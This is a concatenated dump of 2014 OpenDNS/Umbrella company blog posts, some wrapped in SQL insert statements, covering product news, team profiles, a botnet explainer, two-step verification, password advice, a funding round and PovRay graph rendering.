that same period of time, we also invented and brought to market a new enterprise security service. One that only we — with those 50M geographically-distributed users — could. It’s called Umbrella and it uses a combination of machine learning and big data from our DNS traffic to predict and spot threats across the Internet based on analyzing our own data, along with billions of other datapoints from around the Internet. Our security labs are full of researchers who build algorithms to understand how malware spreads, and who build classifiers and anomaly detection systems to identify as-of-yet unknown Internet threats. This predictive nature of our service means we have the capability to identify threats other security vendors don’t. And because it’s based on DNS, it’s delivered as a service, and it’s not perimeter-dependent like most existing security solutions. Again, we’re seeing sign-ups in droves, but this time we’re being paid for it. It felt good to again reimagine something and build it, and see customers reap much value from it.\nAnd I’ll say that the relationship between us and our customers is stronger, because we are building a service for the people who are paying for it. We’re not in some weird three-way handshake that is difficult to balance where we want a great user experience on the one hand, but we get paid by advertisers on the other hand. The cognitive dissonance was getting unwieldy. And frankly, nobody loves ads. At best, ads are a thing you have to do, and you make them as good as you can, when there isn’t a better business model. And for consumer services, there rarely is anything that performs better than ads.\nOur enterprise service contributes the vast majority of our revenue now, but not all of it. Those ads from the Guide still account for a meaningful amount of money on our balance sheet, on the order of millions of dollars annually. That put us at a crossroads where we were conflicted by the meaningful amount of revenue from the ads on the Guide and the truth that, today, they lessen our DNS service’s user experience.\nWe first asked ourselves, “Why do people choose our DNS service?” The answers took me back to that place in 2005 when we set out to do something I saw as noble and important. Make the Internet better by giving people a superior option in DNS. They choose it because it’s safer, faster and more reliable — all 50 million+ of them. And the Guide, originally designed as a way to keep people moving forward, now rarely shows up, and when it does, we know it isn’t the right experience. The guide delivers an experience that’s not inline with what they expect or want. So it has to go.\nThere’s also the elephant in the room: ads and security don’t mix. It’s clear to us that they are fundamentally incompatible. Text ads and banners alike, they’re all vectors for the spread of malware. We’re a security company first, trusted and relied on by Fortune 100 organizations to protect their people, data and networks. Anything that weakens our security offering by introducing vulnerabilities is a conflict. As we’ve become more and more of a security company, it was clear ads couldn’t stay.\nSo we made the call: The Guide will go away on June 6th. While the math in the short term makes this appear to be a bad business decision, it’s the long-term impact that makes the decision the correct one. And OpenDNS is playing the long game. We all are here. This experience is one of the only reasons people cite to not use OpenDNS. And today more than 2% of all of the world’s Internet users rely on our DNS service to navigate the Internet safely and reliably. My expectation is that with this reason eliminated, we’ll welcome (and welcome back) waves of happy OpenDNS users. In order to build a sustainable, growing business, a delightful customer experience is a must. And sometimes revenue and experience conflict. When they do, and when we can, we we want to put user experience first.\nOn June 6th, the OpenDNS Guide will cease to exist. If OpenDNS users type a phrase that isn’t a website address into their browser address bar, they’ll get whatever experience the creators of their browser intended. A native, unaltered navigation experience. Ultimately, I feel great about the decision, guided by delivering — first and foremost — a fantastic user experience. And my hope is that this new OpenDNS experience will be met with satisfaction by our users, whose loyalty we are incredibly thankful for. Internally, we know this is the right call, and it allows us to focus all of our energy on building world-class DNS and security services.', 'Announcements', 'https://umbrella.cisco.com/blog/2014/05/29/no-more-ads/');

Watch How Wolves Change Rivers video below.\n\nHow do you build your own All-Star wolf pack that will help you to bring a disruptive innovation and to reshape your industry? Here are the four points to consider.\n1. Rock Star vs All-Star Team\nEvery founder and hiring manager wants to build an All-Star team. But with the day-to-day reality of the growth march, to build one more feature to test the product-market-fit, and with an infrequent supply of All-Star applicants, instead of an All-Star team, it becomes a Rock Star team where one Rock Star hire leads a team of good-enough hires.\nA team lead by a Rock Star hire will excel initially but will soon produce negative effects of knowledge silos, unchallenged decisions, lack of diverse innovation, and lack of team growth. It is of the utmost importance that you focus on building the best team rather than to just hire the best people.\n2. Culture Fit vs Core Value Fit\nYou may hear other companies define culture fit as “someone you can grab a beer with at a bar”. This may create a fun fit culture, but will end up building a homogenous team that will be counter-productive, hamper growth, and limit disruptive and diverse innovation.\nCompanies should measure culture fit with their core values. Core values define the company’s principles to help them dictate their unique culture. At OpenDNS, we have five core values:\nIt’s your ship: Take initiative and take responsibility for your actions.\nEvangelize greatness: Success comes from a commitment to always improving.\nBe the strongest link: Support your team’s success by always exceeding expectations.\nAlways be advancing: It’s never enough for our company to hold a position, success comes from always advancing.\nRaise your hand: Solicit help early and involve others when needed.\nCore value fit triumphs beer-buddy culture fit.\n3. Putting Out the Fire vs Building For the Future\nAn All-Star team not only builds for today but add flexibility to change in near future and thus positions the company to be ready to take advantage of the external opportunities that come along. When a team is not an All-Star team, many architectural decisions will be implemented just to solve a “putting out the fire” requirement. To become competitive, your team not only needs to put out fires, but also build a flexibility and adaptability for any market opportunities that may come along.\nA smart, intrapreneurial All-Star team will let your company recognize and outpace the competition. Prioritize finding a team that can respond and execute in unison and on target.\n4. Mediocrity Enabled vs Removal of 6’s\nOne of the dangerous hires is what’s known as the “6’s”. If you rank your hire from 1 to 10 where 1-5 represents low performers and 9-10 represents high performers, then “6’s” represent mediocracy.\n“But, “6′s” fly under the radar and do just enough work to get by day-to-day. Even worse, they really irritate the high performers (9-10). Since they don’t want to get exposed, they attract other “6′s” to the company. And before you know it, your team slips from being great to being mediocre. It’s extremely important to remove these people from your team as they can be successful somewhere else.” — Michael Karnjanaprakorn, CEO/Co-founder of Skillshare\nThis 1-10 performance rating applies for each experience class. You can hire a junior or an intern that are high performers in their experience level, and can still build an All-Star team. Get rid of mediocrity and make sure to flush the “6’s” in your hiring process.  At OpenDNS, recruiting and engineering team collaborate closely and we constantly refine our interview process that helps us to find high performers and filter out mediocracy.\nAlways focus on building your All-Star Team with above points and soon your company will reshape your industry and leave your competitors behind.\n\nAre you a high performer and want to be part of our All-Star team?

This phrase was most likely meant to encourage people to ask questions. Then again, if you’re like me, if you come across a question as simple as “What is a Botnet?”, you feel a bit stupid for wanting to ask it. As I delve deeper into the wonderful rabbit hole that is Internet security research, I’ve encountered several questions that, while very simple to many of my coworkers and teammates, are confusing to someone like me. And if GI-JOE has taught me anything…\n\nI’m sure you’ve also heard “Education is the first step to success!” As time marches on, and with internet security becoming a bigger and bigger part of our everyday lives, this statement really couldn’t be more relevant – even to the point where I  almost want to change it to “Education is the first step to Internet Security.” (Hey marketing, check me out!)\nWhere was I… Oh yes! BOTNETS! Let’s talk about botnets.\nIf you look up the definition on Wikipedia, it states that a botnet is a “collection of internet-connected programs communicating with other, similar programs in order to perform tasks.” Welp, thanks Wikipedia, my work here is done. (Kidding!)\nLet’s break this down a bit. A botnet is a collection of compromised hosts (the ‘hosts’ being computers. a.k.a. YOUR computer), that are controlled by a single entity, usually through the use of a server known as a botnet controller (or the Mothership as I like to call it).  The goal of the botnet is to compromise/infect as many hosts as possible in order to create a large network of hosts (Regularships) that the botnet can then use to spread additional malware or spam, or perform a distributed denial-of-service (DDoS) attack. For example, a botnet can take a website offline by having all of the Regularships attack the website at the same time.\nMake sense?\nIt’s kinda like in that book Ender’s Game when Ender eventually realizes that the alien ships are moving so perfectly in unison because they’re all being controlled by the single ship in the center of the formation.\n(p.s. If you’re annoyed by that pseudo spoiler, you shouldn’t be because that’s not even the best part of that book and the whole thing is great.)\n\nThe underlying truth here is that unless you purposely installed the malware onto your computer/network, chances are you don’t want it there. This is where Umbrella comes in real handy. Not only do we use our extensive data collection network to create algorithms and classifiers to predict future attacks, we also provide you with the tools to pinpoint which computer (or computers) on your network are the source of the activity. With this information we can help you contain the attack, thus enabling you to connect to the Internet with a double dose of confidence.\nSo yeah, that’s a botnet, in a nutshell…albeit a very oddly shaped nutshell.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1537, 'Launching Two-Step Verification', 'Philip Thomas', 'May 22, 2014', 'What\nTwo-step verification, also known as two-factor authentication, makes logging into online accounts safer by combining something memorized – a password – with something possessed – a time-based security code. This account security feature is now available for all customers in the Umbrella Dashboard.\nWhy\nAccessing most online accounts requires a username and a password. A password alone is not a strong way of ensuring account security – passwords can be shared between accounts and people.\nTwo-step verification adds a second step to the login process to prevent unauthorized access. After supplying the account password, the user inputs a time-based security code that is generated. This security code changes to a new seemingly random code every 30 seconds, so to gain access to an account you must physically possess the source of codes. This helps ensure that only the owner of the account may sign in.\nHow it Works\nTwo-step verification implements a one-time password system. The basic goal of the system is to verify that a user is who they say they are without communicating anything secret. It does this by generating security codes that change based on time. The system is designed so that, even if all of the security codes are stolen – for example, if traffic is being intercepted – then future security tokens cannot be predicted. Unlike passwords, if a security token is stolen, it is only valid for up to 30 seconds.\nCreating these security tokens in a deterministic but seemingly random way is accomplished by sharing a secret key between the user and the server. After this secret key is synchronized it is never shared again. The server and user combine this secret key with the current time using a hashing algorithm to generate one-time passwords. By standardizing the hashing algorithm and ensuring accurate clocks, the same six-digit password is generated by both the user and the server.\nIf the security token sent by the user matches the one generated by the server, then it is assumed that the user has the correct secret key and is who they claim to be.\nHow\nThree main methods of implementing one-time passwords exist. Because the generation of the token requires an intense mathematical hash the system is not simple.\nHardware Tokens have a secret key, then calculate security tokens that they normally display on a screen. These types of devices have been a common sight on the keychains of banking employees for decades.\nIn an SMS-based system, the server generates the token, sends it to the user via SMS, then the user inputs it into the login system. In this sense, the server sends a code to the user then makes sure that it receives back the same password the user received.\nThe third method of one-time password generation is with a smartphone application such as Google Authenticator or Authy. After a user downloads the smart phone application, they enable two-step verification on their account and receive the secret key by scanning a QR code. In this setup, the user’s phone calculates the one-time password every time that they try to sign in.\nOpenDNS Implementation\nTwo-step verification at OpenDNS began as a hackathon project. After a team of engineers built the two-step verification system in a 24-hour, coffee-fueled sprint, the project was passed onto the A-Team to ready it for production.\nOpenDNS supports SMS and App-based two-step verification. To enable it on your account, in the Umbrella Dashboard go to your account settings.\nOpenDNS provides a recovery code when you enable two-step verification. This code allows you to disable two-step verification should you lose your phone. Treat this recovery code like a password but store it separately from your account password – our engineers prefer keeping recovery codes in a Truecrypt volume on Dropbox or in 1Password.\nApp or SMS?\nSMS is the easier option. It requires no application, it works on any phone that uses text messages, and if a user loses their phone then the new one can still have the same phone number. Because the text message passes through many services in plaintext before it reaches the user, this is not as secure as having the user generate their own one-time password.\nPhone applications are the recommended choice because the user generates their own security tokens every time they log in. In addition, the application still generates tokens without cell signal or internet.\nNext Steps\nLog into the Umbrella Dashboard and improve your account security with two-step verification.', 'Product Release;Scale;Security Engineering', 'https://umbrella.cisco.com/blog/2014/05/22/launching-two-step-verification/');

In the webcast, he examined how the security needs of today are completely different than those of yesterday, primarily because the way we work has evolved.\nEmployees are no longer confined to a desk, inside a cubicle, inside your network. The advent of mobile devices and laptop technology, along with increased adoption of cloud services, has made the world one big mobile office. People now work from their homes, coffee shops, and airports – sometimes with the blessing of IT, sometimes without it. This has drastically changed the security landscape – you can’t just build a wall around your “castle” and call it a day.\nSo what can you do to protect your users and your data from today’s threats without sacrificing productivity and mobility? Your security strategy will need three key elements to be effective:\nConsistency\nIn the face of modern threats, which are both persistent and advanced, your security policies need to be consistently enforced across user levels and groups, so that you don’t have gaps for attackers to exploit. This also helps to keep track of what can be accessed by which users. An example of this is having different policies for different departments.\nAlways-On\nYour users aren’t always in the office, and they’re not always working within set hours – why should your security solution? With the amphibious nature of both data and devices (from office to home and vice-versa) in the new working world, you need constant protection, wherever your users may be located.\nContext\nIf your security strategy only focuses on being consistent and always-on, it may come across as heavy-handed to employees used to functioning seamlessly between work and home. That’s why the final piece of this puzzle is so important. Context helps you provide the right level of security, at the right time, on the right device. For example, different policies applied to the same device when a user is on an office network or a home network. As David says during the webcast: “[Your security policy] should be consistently applied, but contextually delivered.”\nBut wait, there’s more!\nIn addition to exploring these points in-depth, this webcast features a look at enforcing security at each one of seven layers: your data, apps, users, endpoints, network, perimeter, and the Internet itself.\nWatch the full on-demand webcast here:\n\nRead more about how Umbrella by OpenDNS provides security for the way the world works today here.

In her talk, Justine also pointed out the importance of communicating the skills and expertise developed inside the security community to society at large.\nIn Top 50 Non-State Hacker Groups of the World, Christopher Ahlberg (@cahlberg) from Recorded Future gave a gripping presentation about monitoring and tracking the activities of renowned hacker groups such as Anonymous, SEA, Lulzsec, etc through mining of social media feeds and data visualization.\nI also enjoyed the very instructive talk of Patrick Wardle (@patrickwardle) from Synack entitled “iOS App Reversing: A Practical Approach” where he covered four main themes:\nThe iOS environment (app security model, app binary format, Objective-C, ARM architecture),\nHow to prepare a reversing environment (reversing tools, getting apps, app decryption),\niOS reversing techniques such as dynamic analysis, network analysis, file system I/O monitoring, app debugging, app instrumentation, and reversing tools such as Otool, Class-Dump, IDA Pro, etc. and\niOS app vulnerabilities involving the network and data storage (within the binary, the Plist, database, or logfile).\nFinally, the keynote by Bruce Schneier (@schneierblog) stimulated the interest of a large crowd where he touched upon security and its relation to power in the light of the recent revelations about governmental mass surveillance; censorship employed by unsavory regimes; and propaganda in general. Bruce raised questions such as: “How do we as a society navigate this new world where big data blends with power and control?” and  “How to preserve the good and prevent the bad in this relationship.”\n\nIn my talk “Marauder or Scanning your DNSDB for Fun and Profit”, I covered the malicious domains detection system I built that leverages both OpenDNS’s DNSDB and streaming authoritative DNS traffic. The DNSDB and streaming DNS platform were developed by our research and engineering teams and they represent core elements of our feeds for fast detection of internet threats. I described the inner workings of the system but also shared some useful data feeds and Python libraries for manipulating HBase, IPs, prefixes, ASNs, and graphs.

This traffic generates around 300 gigabytes of query logs each hour, which contains information crucial to our customers. Analyzing that amount of data, however, is no easy task. The Statistics Team is responsible for building and maintaining the complex architecture that stores and processes the massive amounts of data collected. The platform enables OpenDNS customers to gain insight into the security of their networks and the security team to study malware infection patterns around the world.\nThe Statistics infrastructure is responsible for all reports generated within the Umbrella Dashboard. The process begins with collecting the raw query logs as they come in from all of our DNS resolvers, iOS VPN systems, and proxies. Once the logs are filtered for essential information, they are stored in a Hadoop cluster where different MapReduce algorithms run and generate key statistics. Utilizing Hadoop and MapReduce enables a huge dataset to be processed much faster by breaking it into many subsets, processing each subset individually, and then combining the results of each subset. The statistics are then stored in an HBase distributed database for our customers to quickly access. One large cluster is used for processing all query logs to generate report data, which syncs with a backup cluster to keep an active copy as a failsafe. A special cluster was built for the Security Research team, which gives them a sandbox to experiment with new algorithms against real-time data and stay current with the latest types of attacks.\nOverview of Statistics Systems\n\nSome recent projects completed by the Statistics Team include real-time analytics and the backend system for our recently renamed Investigate product. Our customers need to see activity within their network as it happens, and waiting for data to be processed doesn’t make that possible. Since it can take up to 40 minutes for all the MapReduce jobs to run, a separate Kafka and Storm cluster was built to enable searching for DNS logs in real time. The OpenDNS Investigate product was initially developed as an internal research tool, but it quickly became evident how valuable it would be to our customers. The Statistics Team took on the task of transferring and scaling a system initially built on a small development box and making it able to handle millions of queries.\nThe Statistics Team consists mostly of software engineers, but is rounded out with a product manager and several technical support, infrastructure, and front-end engineers. This diversity of roles allows other teams to function without worrying about accurately presenting data. It also gives the Statistics Team the capability to pursue projects of our own.

This financing is the largest in our company’s history and almost double our combined previous capital raised. All of our existing investors, Sequoia Capital, Greylock Partners, and Sutter Hill Ventures, participated in the financing and were joined by new investors Glynn Capital, Cisco, Evolution Equity, Lumia Capital, Mohr Davidow Ventures, and Northgate Capital.\nLooking at this in the context of the evolution of the enterprise security space, I want to share a few reasons we decided to raise this round and why I think it’s important for us to be investing in OpenDNS right now.\nFirst – Security needs to be delivered as a service, and OpenDNS’s cloud-delivered solutions are unique in their capabilities and impact in doing that. We’re in a new age of enterprise computing, where people work and access the Internet outside the office, use cloud applications, store their data in the cloud, and are increasingly on mobile devices, many of which are owned by individuals, and not the enterprise. As a result, the old ways of installing desktop AV and sticking a security appliance at the edge of your network are no longer effective. Enterprises need a 24×7, always-on security solution that doesn’t impact performance or annoy their employees. We’ve built just such a service, and while it currently provides security to 50 million people and more than 10,000 enterprise customers, we have a long way to go.\nSecond – We are finding security threats other security vendors aren’t. Because we have more than 50 million daily active users and see so much Internet traffic, we’re able to analyze it and do truly predictive security. Our security labs are full of researchers who build the algorithms to identify how malware spreads, and who build classifiers and anomaly detection systems to identify as-of-yet unknown Internet threats. This capability to identify threats other security vendors don’t see has rapidly accelerated our business, and we want to keep moving even faster. We’re going to use the funding to hire more engineers and researchers, to improve our free services, and to accelerate our go-to-market efforts as a leading enterprise security company.\nThird – We are willing to lean in front of our skis to accelerate our growth. We’ve historically grown primarily through operating cash. But the market is ready for lightweight, highly effective, and easy to manage cloud-delivered security right now. And our product is ready to support that need. OpenDNS is extending (“disrupting”) the $22B perimeter security market with a product that works the way businesses work today and protects workers wherever they are. So the faster we can grow our business, the more people we can hire, and ultimately the better a service we can build and offer. It’s a virtuous cycle, and we want to speed it up.\nThis financing is a milestone worth pausing for, even if just for a moment. While it might not be as important as delivering innovative products that help business and people more safely use the Internet, or partnering with incredible new customers, it does help ensure that we can continue to do those things, and do them faster. We’re humbled by the vote of confidence in our mission that the funding represents and look forward to helping all of you connect with confidence today and tomorrow.

We were interested in realtime rendering in order to navigate inside our security data interactively. We’ve provided videos and online demos of our 3D engine but also details about the force-directed clustering algorithms. These technical details progressively give an overview of the visualization framework we are building here at OpenDNS.\nToday, we will explain a fun way to take advantage of legendary raytracers to produce realistic pictures of our data. We will also share some useful pieces of code and scripts to enable the reader to do the same on his own.\n\nA quick word on raytracers and PovRay\nIn the 3D graphics world, there are several types of image rendering. The 2 main techniques are called Rastering and Raytracing. We could go for hours about all the details but it is important to understand the key differences :\nRasterization works by drawing a very large number of triangles on the screen which are then shaded through a GPU pipeline simulating various light models. The resulting image is computed by projecting all the triangles on the screen. The process is extremely fast and is widely used in applications utilizing realtime graphics, requiring a very low latency. (Games, Simulators, Interactive interfaces, etc.)\nRaytracing works differently. It generates an image by tracing the path of light through pixels in an image plane. The light rays traverse the scene according to optics laws (Reflection, Refraction, Diffraction, Absorption, etc.). The process aims to give a high level of realism and comes with a great computational cost. Raytracing is widely used in 3D movies and a single image can often take several hours to be generated.\nPovRay (“Persistence of Vision Raytracer”) belongs to the second category. The interesting thing about PovRay is that it can be scripted and scenes can be described using a simple language. We’re going to take advantage of this to generate our 3D scene from the graph datasets!\n\nFirst step : Create a PovRay template\nThe first thing we need is a PovRay template. We need to define a standard scene and a way to draw nodes and edges.\nVery simple indeed, we’ll start by defining some constants, placing a couple of lights and a camera.\n#include \"colors.inc\"\n\nglobal_settings {\n	assumed_gamma 1.0\n	ambient_light Gray\n}\n\nbackground {\n	color Black\n}\n\nlight_source { <10000, 0, 0> color White }\nlight_source { <0, 10000, 0> color White }\nlight_source { <0, 0, 100000> color White }\n\ncamera {\n  sky <0, 1, 0>\n  right <4/3, 0, 0>\n  look_at <0, 0, 0>\n  location <5.0, 5.0, 5.0>\n}\nMore documentation on lights and camera can be found here :\nhttp://www.povray.org/documentation/view/3.7.0/308/\nhttp://www.povray.org/documentation/view/3.7.0/246/\nAnd we’ll just use spheres for the nodes and cylinders for the edges.\nAs an example, we’ll just define two spheres and one cylinder connecting them.\n// First node\nsphere {\n    <-2.0, 0.0, 0.0>, 1.0 // Position : (-2, 0, 0), Radius : 1.0\n    texture { pigment { color rgb<1.0, 0.0, 0.0> }} // Color : Red\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.2 }\n    }\n}\n\n// Second node\nsphere {\n    <2.0, 0.0, 0.0>, 1.0 // Position : (2, 0, 0), Radius : 1.0\n    texture { pigment { color rgb<0.0, 0.0, 1.0> }} // Color : Blue\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.2 }\n    }\n}\n\ncylinder {\n    <-2.0, 0.0, 0.0>, <2.0, 0.0, 0.0>, 0.5 // Radius : 0.5, from node 1 to 2\n    texture { pigment { color rgb<0.5, 0.5, 0.5> }}\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.5 }\n    }\n}\nIn the “finish” scope, we define the shading of the objects. Essentially it tells PovRay how the spheres/cylinders are going to react to light. In our case, we’ve defined a nice shiny material with some reflections.\nNow if you render this template with PovRay, you should get something like this :\n\n\n\nSecond step : Convert a 3D graph to a PovRay scene\nNow that we have our template, the concept is very simple. We take our graph, create a sphere for each node and then for each edge, create a cylinder connecting the two nodes. And voilà!\nThe pseudo-code to do it would look like this:\nsphere_radius = 1.0\ncylinder_radius = 0.5\n\nforeach node in graph.nodes do\n    generate_sphere(node.position, sphere_radius, node.color)\n\nforeach edge in graph.edges do\n    generate_cylinder(edge.src.position, edge.dst.position, cylinder_radius, edge.color)\nOf course, you can adapt it to map the color/radius to anything else (Node weight, Node degree, Edge type …). It’s up to you!\nIt also means you will need to have the node position already pre-computed using any layout algorithm. You can implement your own or export it from any graph rendering software.\nResults\nHere is a small gallery of datasets obtained using the OpenDNS visualization tool and some some datasets built using our mighty Security Graph:\n\nDegree view of CanSecWest.com (White nodes have the most connections, Black nodes have the least connections)\nCo-occurrence graph around a Cryptolocker domain (Red : Malicious, Green : Benign, White : Unknown)\nSame as above from a different view point and a different color code (Brown : Malicious, Blue : Benign, Yellow : Unknown)\nBreadth First traversal from Reddit.com, nodes are colored according to their types (Blue : Domain, Yellow : IP, Pink : Whois info)\n\nTips:\nDepending on the graph you’re dealing with, you will probably need to adjust the camera position to choose a good view point.\nWhen rendering scenes with raytracers, the image calculation can take a while especially with very large graphs. It is often a good idea to compute the image with a small resolution and a low level of details. This way you will be able to quickly see if your parameters are correct before spending precious minutes/hours rendering a erroneous image. Once you are sure the basic parameters are correct, you can launch the real rendering process with full quality.\nTo achieve the nice “blobby” effect you can see on some of the images, you will need to define a blob scope and a couple of iso-values / thresholds. More documentation here : http://www.povray.org/documentation/view/3.7.0/275/\nConclusion\nWe’ve presented a fun way to take advantage of PovRay to generate realistic pictures of our datasets created with the Security Graph and its API. We hope you found this article interesting and that it hopefully triggered some new ideas. We’ve only used a very tiny part of PovRay’s features but you can definitely go much deeper in refining your template to achieve mind-blowing results.

Together they support sales, support, and other engineering teams in the company. When something breaks, a customer has an issue, or a sales needs help – OpenDNS calls the A- Team!\nBecause its engineers can be interrupted at any time, the A-Team only takes projects that can be completed in under one week. With code dating back to 2006, they are masters of all OpenDNS production systems. Between the members of the team, they have extensive experience in a variety of languages and systems – from Perl to C# and from Hyper-V to Docker, they do it all!\nA Day in the Life\nThe A-Team has a stand-up at 10AM every day for fifteen minutes.  Mr. Manager Justin gives an overview of what is happening in engineering and anything that may require immediate attention. Every member briefly describes what they did the day before and what they plan to do that day. Product Manager Dima lets the team about the latest news from the leadership as he sips a Red Bull. Finally, Mark from Support shares recent feedback from customers (like, “You rock!”).\nEngineers on the A-Team typically work on mini-projects that require a couple days of effort. Small bugs in things like the Umbrella Dashboard are quickly squashed and inline documentation is often tweaked. One of the more substantial projects that took multiple members of the team was the deployment of a two-step verification system for account security. The idea started as a Hackathon project and was completed within 24 hours. Two-step verification requires a time-based token in addition to a password while logging in. This protects against stolen passwords because the customer logging in must have physical possession of their cell phone in addition to a memorized password. The A-Team took the hackathon project and improved its functionality and interfaces. The deployment of two-step verification last week marked one of many hackathon projects that reached customers because of follow-through from the A-Team.\nAnother major responsibility of the A-Team is maintaining the Umbrella Roaming Client.  This software for OSX and for Windows allow customers to extend Umbrella protection to any network their users join.  The development process for these clients is different than most projects in OpenDNS Engineering because the software is shipped rather than continuously updated. This means that it is more difficult to track errors and fix issues, so the testing process normally takes at least a week to ensure that there are no issues before customers receive changes.\nThe A-Team must always be ready to pause its projects when something requires an attention. When a major issues comes in – “blocker bugs” –  the team focuses only on that issue until it is fixed. Tools like Git and Nagios isolate changes that caused any issues.\nA-Team members see the benefits of their work every day. Customers notice improvements in products, and maintaining close ties between the A-Team and Support means that the team is always working to make changes that customers desire most. At the end of the day, A-Team maintains the ease of deployment and simple management for security products that let OpenDNS customers safely connect to the Internet anywhere, anytime.\nThe Team\nJustin “Mr. Manager” Swift – the A-Team’s pilot, he can navigate through any system with precision. Approaching his 3-year anniversary at OpenDNS, Justin is from Pittsburgh and he started at the company as a Windows software expert.\nDoug Tabacco – As an OpenDNS Engineer for almost 5 years, Doug is the “muscle” of the A-Team because he built part of almost every system we’ve deployed. He can often be found organizing board game nights at the office.\nJason Jee – Jason joined the A-Team as an Engineer after graduating from UC Berkeley in 2012. He has become the wizard of the native OSX applications. When taking breaks, Jason often is playing ping-pong with his custom-made paddle.\nPhilip Thomas – Philip joined the A-Team as an Engineer after graduating from Washington University in St. Louis in 2013. He enjoys building data visualization systems for internal use. He runs the OpenLate meetup group at the San Francisco offices.\nDima Kumets – Product Manager Dima is a veteran product manager who has been at OpenDNS for over five years. He is also an expert with a lathe – he built the pepper grinders in the office. His dog Widget serves as the unofficial mascot of the team.\nMark “Slam Dunk” Dunkley – Mark manages the OpenDNS technical support team. He attends all A-Team meetings on behalf of support. Mark can be found hiking, mountain biking or snowboarding the north shore mountains in Vancouver.\nFuture Projects\nOpening API access – working on giving customers programmatic access to OpenDNS systems\nOpen source contributions: The A-Team is tasked with open sourcing some internal tools in the coming quarter.

Passwords have existed in one form or another since ancient times. Once used to keep evildoers out of encampments, they now protect our data and identities from modern-day criminals. Apps, online accounts, ATMs, and really cool secret restaurants all require passwords, and with good reason.\nWith data breaches continuously making headlines, creating a secure password and keeping it safe should be top-of-mind for everyone. In this post, we’ll share tips from IT professionals about how to manage your passwords.\nGandalf had the right idea.\n\n\nThe More You Know – Tips from the Pros\nOpenDNS customers are in the trenches everyday, keeping their users safe from online threats, and possibly the occasional PEBCAK. We asked them for their best suggestions for keeping users secure – and password education topped the list:\n“Write down passwords (or use a password manager). I would rather my users write down a secure password than memorize an insecure one they use in multiple places.” – Jerry Gamblin, Security Specialist\nWhen you get down to it, humans simply cannot remember truly secure passwords. No matter how good your memory is, a string like ~0Dn5.1$4w3S0m3! is too complex – especially when you consider how many passwords you type in on a daily basis. The value of a password is based on how difficult it is to crack, not how easy it is to remember.\n“Use a different password for each site.” – Janet Kowal, Head of Computer Services/Reference Librarian\nHerein lies the true value of a password manager. When you type in several passwords on a daily basis, the fact is, each one of those passwords should be unique. Why? If an attacker gains access to your password anywhere, they now have access to every other account you own. Don’t make it easy for criminals to access your information.\n“Use 1Password! Randomly generated passwords across hundreds of sites!” – Phil Havens, SysAdmin\nIf physically writing passwords isn’t your thing, a password manager can do the work for you. 1Password, Dashlane, and LastPass are all examples of password managers, which you can use to create and store secure passwords, so that “forgot your password?” will be a thing of the past.\n“Set up a Windows password. Most home users and many small businesses do not use passwords. The computer just boots up into a default account with no password on it that has full administrator privileges.” – Matthew Wilson, Technology Consultant\nWhen thinking about security, many people focus only on what happens online or in apps – they overlook securing a machine or smartphone with a lock password. None of the password safeguards matter if an attacker gains access to your physical device.\n“Passwords are like toothbrushes – don’t share them!” – Andrew Hay, Senior Security Research Lead and Evangelist, OpenDNS\nThere is no reason to share your passwords with anyone, no matter who they are, or why they’re asking. Always enter your passwords yourself. “Loose lips sink ships,” as they say.\nSo what makes a password secure?\nIt’s more than just adding a capital letter and some numbers.  Here’s a few examples to avoid, collected by SplashData:\n\nYou know better than that, right? The strongest passwords are lengthy, impersonal, and make use of various characters. Here are a few basic tips:\nDon’t use dictionary words.\nDon’t use personal information that attackers could easily access or guess, for example, a telephone number or family name.\nDon’t be afraid to go long – the longer your password, the better.\nDon’t be afraid to use various characters. Make it weird – and in doing so – harder to crack.\nConclusion\nYou’ve read this blog – what’s next? Hopefully, you have set up a password manager, and you have unique, complex passwords for each site you visit. While you shouldn’t share your passwords, you should share this information with everyone you know. Passwords are universal – good password practice isn’t.', 'Community', 'https://umbrella.cisco.com/blog/2014/05/09/password-security-easy-1234567/');

Sydney marks the 21st location in our global network and our first south of the equator!\n\nBuilding Sydney\nIt’s been great to see the results of all the hard work by everyone on the team and to see a site go from planning to serving traffic! How did we do it? Bryan, one of our data center experts, flew to Australia to install our new hardware. While Bryan racked and stacked gear, the rest of the infrastructure engineering team finalized the server and network equipment configuration remotely, from our San Francisco and Vancouver offices. Our network engineering team has worked hard to improve routing for users in Australia.\nTo serve anycast traffic for Australia and New Zealand, we got the best local connectivity by partnering with some of our existing global carriers, as well as Telstra, the largest Australian ISP (Internet Service Provider). In addition to the direct connections with these large ISPs, we also use local peering in Sydney. This connects us directly to many of the local and regional networks.\nUser experience\nThis new site directly benefits our user base in Australia and New Zealand. Previously, these users were served by our data center in Singapore, which is about 140 milliseconds from Sydney. In terms of latency, bandwidth, and resiliency, the benefits are significant. We’re thrilled to see an increase in traffic from both Australia and New Zealand since the opening of this new data center. It means that many of you already discovered our new site and switched to OpenDNS, which is a great validation of our improved service in the region.\nMore to come!\nOver the next few months OpenDNS will continue to expand our global network.

Being a DNS provider has a lot of advantages; It offers a bird’s eye view of connectivity across our entire customer base, allows us to use that data to benefit everybody,  and it’s a simple way to inspect traffic from any device, anywhere, and at any time. However, high quality security requires information beyond domain names alone. This is where the OpenDNS Intelligent Proxy comes in. We call it the “intelligent proxy” because unlike other proxy based solutions, we don’t have to proxy absolutely everything to catch suspicious activity. Whenever we see a DNS query to a questionable domain, perhaps one that we don’t want to completely allow or block, we direct the request to a proxy. By doing this, we can dive deeper into the transaction and make a more informed decision on whether it is safe or potentially dangerous.\nInspecting traffic\nA key feature, which lends itself to the success of the proxy, is its speed. The overhead is less than 200ms per query. This is because our fleet of proxies is spread a across  our data centers worldwide – with plans for additional areas in the near-term. In addition, we only perform deep inspection of suspicious domains that meet certain criteria. Everything else goes straight to the internet.\nA query for a safe site (seen below) will return the original address:\n\n\nBut a query for a questionable one (see below) will return an IP of one of the proxies:\n\nMonitoring Stats\nA granular understanding of how our global proxies operate is very important. The things we monitor are important not just for traffic patterns, anomalies, latency, and performance, but also serve as an important source of data for our research team. Cross referencing performance parameters like requests per second or bytes per second with security parameters such as DNS query results, the number of blocked requests, and changes to our suspicious list of URLs/domains serve many purposes. Among them are:\nDetecting malware outbreaks, which often involve a spike in the number of blocked requests from a specific destination.\nDetecting DoS attacks, which are characterized by a general spike in traffic, usually from one or few sources.\nNoticing when something is not right on our end, like a false positive entry in the suspicious URL list 